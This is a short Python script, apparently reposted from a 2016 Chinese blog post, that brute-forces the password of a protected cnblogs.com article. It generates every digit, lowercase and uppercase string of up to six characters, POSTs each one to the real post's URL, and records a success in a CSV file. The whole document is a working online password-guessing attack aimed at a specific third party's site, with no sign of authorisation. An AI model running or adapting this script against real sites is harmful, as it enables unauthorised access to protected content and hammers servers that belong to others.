# -*- coding: utf-8 -*-
"""
Created on Mon Sep  4 21:33:17 2017

@author: HanKin
"""

"""
python3暴力穷举密码
2016年6月09日 04:39:25 codegay
"""
from time import strftime
from itertools import product
from time import sleep
from tqdm import tqdm
import requests
from requests import post
 
#密码生成器
def psgen(x=4):
  iter = ['1234567890',
      'abcdefghijklmnopqrstuvwxyz',
      'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
 
      ]
  for r in iter:
    for repeat in range(1,x+1):
      for ps in product(r,repeat=repeat):
        yield ''.join(ps)
 
def fx(url):
#把URL中的readauth字符删掉，替换成"http://www.cnblogs.com/muer/archive/2011/11/27/factualism.html"这样的格式，因为这个才POST的目标地址。
  url = url.replace("/post/readauth?url=", "")
  for ps in tqdm(psgen(6)):
    try:
      rs=post(url,data={'tb_password':ps},allow_redirects=1)
      if rs.url == url: #如果提交密码后，返回的url得到为"http://www.cnblogs.com/muer/archive/2011/11/27/factualism.html"这样的形式，那么认为猜到正确的密码了。
        with open("resut.csv","a+") as f:
          f.write('密码破解成功结果为：,'+ ps + ',' + strftime("%c") + ',' + url+'\n')
        break
    except:
      sleep(1)
      pass
 
url='http://www.cnblogs.com/post/readauth?url=/muer/archive/2011/11/27/factualism.html'
fx(url)